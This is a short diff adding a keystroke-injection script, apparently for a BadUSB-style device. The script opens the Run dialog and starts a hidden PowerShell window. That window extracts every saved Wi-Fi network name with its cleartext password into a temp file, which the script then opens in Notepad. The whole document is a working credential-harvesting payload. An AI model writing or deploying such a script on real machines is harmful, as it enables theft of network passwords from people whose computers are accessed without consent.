@@ -1,0 +1,9 @@
+GUI_R
+DELAY:800
+KEY:powershell -windowstyle hidden -command "netsh wlan show profiles | Select-String 'All User Profile' | ForEach-Object { $p = ($_ -split ':')[1].Trim(); $k = (netsh wlan show profile name=$p key=clear | Select-String 'Key Content'); [pscustomobject]@{SSID=$p; Password=($k -split ':')[1].Trim()} } | Out-File $env:TEMP\wifipass.txt -Encoding UTF8"
+ENTER
+DELAY:3000
+GUI_R
+DELAY:800
+KEY:notepad %TEMP%\wifipass.txt
+ENTER
